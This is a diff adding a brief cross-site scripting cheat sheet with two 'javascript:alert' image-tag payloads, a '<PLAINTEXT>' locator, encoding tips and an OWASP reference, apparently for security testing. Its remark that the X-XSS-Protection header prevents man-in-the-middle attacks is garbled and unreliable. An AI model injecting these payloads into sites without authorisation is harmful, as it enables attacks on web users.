@@ -1,0 +1,17 @@
+XXS payloads
+
+If it's via URL try URL encoding
+Look-out for X-XSS-Protection header, it will prevent XSS, MiTM and set to '0' may help.
+
+XSS LOCATOR
+------------
+<PLAINTEXT>
+
+Payloads
+--------
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+
+
+Ref:
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
